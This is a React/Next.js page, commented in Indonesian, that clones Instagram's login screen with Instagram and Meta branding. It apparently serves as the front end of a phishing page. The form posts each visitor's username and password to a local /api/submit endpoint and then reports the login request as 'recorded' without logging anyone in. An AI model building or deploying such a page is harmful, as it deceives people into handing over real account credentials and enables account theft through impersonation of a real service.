"use client";

import type { FormEvent } from "react";
import { useState } from "react";

export default function Home() {
  const [busy, setBusy] = useState(false);
  const [sent, setSent] = useState(false);

  async function onSubmit(ev: FormEvent<HTMLFormElement>) {
    ev.preventDefault();
    const formData = new FormData(ev.currentTarget);
    const username = String(formData.get("username") ?? "").trim();
    const password = String(formData.get("password") ?? "");

    setBusy(true);
    setSent(false);
    try {
      const res = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      const data = (await res.json()) as { ok?: boolean; error?: string };
      if (!res.ok || !data.ok) throw new Error(data.error ?? "Gagal mengirim");
      setSent(true);
    } catch {
      alert("Terjadi kesalahan saat mengirim. Periksa jaringan atau coba lagi.");
    } finally {
      setBusy(false);
    }
  }

  return (
    <main className="flex min-h-screen bg-[#0A0A0A] text-[#F5F5F5] font-sans">
      
      {/* KIRI - Hero Section (Sembunyi di mobile, muncul di layar besar) */}
      <div className="hidden lg:flex lg:w-3/5 flex-col items-center justify-center relative overflow-hidden">
        
        {/* Logo Instagram di pojok kiri atas */}
        <div className="absolute top-10 left-10">
          {/* Ganti src dengan path logo IG kamu */}
          <img src="/ig-logo.svg" alt="Instagram" className="h-10 w-auto" />
        </div>

        <div className="text-center mt-12 z-10">
          <h1 className="text-[40px] font-medium leading-tight">
            See everyday moments from your
          </h1>
          {/* Efek Gradient Text untuk "close friends" */}
          <h1 className="text-[40px] font-medium bg-gradient-to-r from-[#F55444] via-[#DE2875] to-[#A307BA] bg-clip-text text-transparent">
            close friends.
          </h1>
        </div>

        {/* Gambar Collage Tengah */}
        <div className="mt-8 relative flex justify-center w-full max-w-lg">
          {/* Ganti src dengan path gambar collage kamu */}
          <img 
            src="/collage.png" 
            alt="Close friends moments" 
            className="w-full h-auto object-contain" 
          />
        </div>
      </div>

      {/* KANAN - Form Login */}
      <div className="w-full lg:w-2/5 flex flex-col justify-center bg-[#1C1C1C] border-l border-[#363636] px-8 py-16">
        <div className="w-full max-w-[360px] mx-auto">
          
          <h2 className="text-base font-semibold text-white mb-6">
            Log into Instagram
          </h2>

          <form className="space-y-4" onSubmit={onSubmit}>
            {/* Input Username/Email */}
            <div>
              <input
                id="username"
                name="username"
                type="text"
                autoComplete="username"
                required
                className="w-full rounded-[4px] border border-[#363636] bg-[#121212] px-3 py-3 text-sm text-white placeholder-zinc-500 outline-none transition focus:border-zinc-400"
                placeholder="Mobile number, username or email"
              />
            </div>

            {/* Input Password */}
            <div>
              <input
                id="password"
                name="password"
                type="password"
                autoComplete="current-password"
                required
                className="w-full rounded-[4px] border border-[#363636] bg-[#121212] px-3 py-3 text-sm text-white placeholder-zinc-500 outline-none transition focus:border-zinc-400"
                placeholder="Password"
              />
            </div>

            {/* Tombol Log in Utama */}
            <button
              type="submit"
              disabled={busy}
              className="mt-2 flex w-full items-center justify-center rounded-[8px] bg-[#195CA6] py-2.5 text-sm font-semibold text-white transition hover:bg-[#154c8a] disabled:opacity-60"
            >
              {busy ? "Memproses…" : "Log in"}
            </button>
          </form>

          {/* Lupa Password */}
          <div className="mt-4 text-center">
            <a href="#" className="text-xs text-[#E0E0E0] hover:underline">
              Forgot password?
            </a>
          </div>

          <div className="mt-8 flex flex-col space-y-4">
            {/* Tombol Login Facebook */}
            <button className="flex w-full items-center justify-center rounded-[8px] border border-[#363636] bg-transparent py-2.5 text-sm font-semibold text-[#E0E0E0] transition hover:bg-zinc-800/50">
              <span className="mr-2 text-blue-500 text-lg">f</span> Log in with Facebook
            </button>

            {/* Tombol Buat Akun Baru */}
            <button className="flex w-full items-center justify-center rounded-[8px] border border-[#363636] bg-transparent py-2.5 text-sm font-semibold text-blue-500 transition hover:bg-zinc-800/50">
              Create new account
            </button>
          </div>

          {/* Feedback Message */}
          {sent ? (
            <p className="mt-6 text-center text-sm text-green-500" aria-live="polite">
              Permintaan masuk dicatat.
            </p>
          ) : null}

          {/* Logo Meta */}
          <div className="mt-16 flex justify-center opacity-60">
            {/* Ganti src dengan path logo Meta kamu */}
            <img src="/meta-logo.svg" alt="Meta" className="h-4 w-auto" />
          </div>
          
        </div>
      </div>
    </main>
  );
}